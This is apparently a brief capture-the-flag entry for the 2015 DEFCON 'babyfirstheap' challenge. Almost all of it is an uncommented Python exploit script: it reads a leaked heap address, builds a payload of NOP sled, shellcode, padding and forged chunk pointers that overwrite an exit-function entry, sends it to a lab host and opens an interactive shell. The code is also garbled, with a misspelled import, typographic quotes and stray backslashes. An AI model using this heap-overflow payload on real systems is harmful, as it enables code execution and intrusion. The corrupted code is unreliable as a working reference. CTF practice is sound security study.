entry.title: 2015 DEFCON Babyfirstheap
entry.content:
\‘from pwn_expoit import * import time a = 0.3 def MakeCon(): MakeCon = remote(“192.168.224.152”,4444) return MakeCon

s = MakeCon() leak = s.recvuntil(“[size=260]”)[-18:-11] hex_addr = int(“0x”+leak,16) print hex_addr exit_func = 0x804c8ac dat = “” dat += “\xeb\x0c” dat += nopsled(30) dat += shellcode(32) dat += “A”*(260-len(dat)) dat += “\x01\x00\x00\x00” dat += p32(exit_func-0x8) dat += p32(hex_addr) time.sleep(a) s.send(dat+“\n”) s.interactive() \'
